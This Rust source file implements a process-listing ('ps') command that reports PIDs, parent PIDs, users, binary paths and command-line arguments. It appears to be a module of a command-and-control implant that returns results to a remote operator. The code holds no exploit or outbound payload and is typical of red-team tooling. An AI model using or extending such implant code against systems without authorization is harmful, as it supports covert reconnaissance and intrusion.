use crate::structs::{ProcessDetails, Task};
use crate::utils;
use serde::Deserialize;
use std::collections::HashMap;
use sysinfo::System;

#[derive(Deserialize)]
struct PsArgs {
    #[serde(default)]
    regex_filter: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: PsArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(_) => {
            // If params is a non-empty non-JSON string, treat it as a regex filter
            let p = task.data.params.trim().to_string();
            PsArgs {
                regex_filter: if p == "{}" || p.is_empty() { String::new() } else { p },
            }
        }
    };

    utils::print_debug(&format!(
        "ps: executing with regex_filter='{}'",
        args.regex_filter
    ));

    // Run sysinfo in a blocking thread since it does heavy system calls
    let regex_filter = args.regex_filter.clone();
    let result = tokio::task::spawn_blocking(move || {
        collect_processes(&regex_filter)
    })
    .await;

    match result {
        Ok(processes) => {
            utils::print_debug(&format!("ps: collected {} processes", processes.len()));
            response.user_output = serde_json::to_string_pretty(&processes)
                .unwrap_or_else(|_| "[]".to_string());
            response.processes = Some(processes);
            response.completed = true;
        }
        Err(e) => {
            utils::print_debug(&format!("ps: spawn_blocking failed: {:?}", e));
            response.set_error(&format!("Failed to collect processes: {:?}", e));
        }
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}

fn collect_processes(regex_filter: &str) -> Vec<ProcessDetails> {
    let sys = System::new_all();

    let re = if !regex_filter.is_empty() {
        regex::Regex::new(regex_filter).ok()
    } else {
        None
    };

    let mut processes = Vec::new();
    for (pid, process) in sys.processes() {
        let name = process.name().to_string_lossy().to_string();

        if let Some(ref re) = re {
            if !re.is_match(&name) {
                continue;
            }
        }

        let ppid = process.parent().map(|p| p.as_u32() as i32).unwrap_or(0);
        let user = process
            .user_id()
            .and_then(|uid| {
                nix::unistd::User::from_uid(nix::unistd::Uid::from_raw(**uid))
                    .ok()
                    .flatten()
            })
            .map(|u| u.name)
            .unwrap_or_default();

        let bin_path = process
            .exe()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_default();

        processes.push(ProcessDetails {
            process_id: pid.as_u32() as i32,
            parent_process_id: ppid,
            arch: std::env::consts::ARCH.to_string(),
            user,
            bin_path,
            arguments: process
                .cmd()
                .iter()
                .map(|s| s.to_string_lossy().to_string())
                .collect(),
            environment: HashMap::new(),
            sandbox_path: String::new(),
            scripting_properties: HashMap::new(),
            name,
            bundle_id: String::new(),
            update_deleted: true,
            additional_information: HashMap::new(),
        });
    }
    processes
}
